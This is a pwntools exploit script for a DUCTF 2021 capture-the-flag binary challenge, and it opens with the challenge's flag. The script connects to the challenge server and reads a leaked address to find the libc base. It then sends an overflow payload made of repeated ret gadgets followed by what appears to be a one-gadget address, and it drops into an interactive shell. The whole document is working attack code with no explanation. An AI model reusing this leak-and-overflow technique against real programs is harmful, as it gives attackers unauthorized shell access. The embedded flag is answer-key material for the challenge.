#DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}
from pwn import *

libc = ELF("./libc-2.27.so")

target = remote("pwn-2021.duc.tf", 31909)

target.sendline("\n19")

target.recvuntil("Your magic number is: ")
libc_base = int(target.recvline().strip(), 0x10) - libc.sym['puts'] - 0x1a2
libc_base = libc_base & 0xfffffffffffff000
log.info("LIBC Base: " + hex(libc_base))

ret = p64(libc_base + 0x00000000000b15a5)
payload = ret * 31 + p64(libc_base + 0x4f3d5)

target.sendline("256\n" + payload)

target.interactive()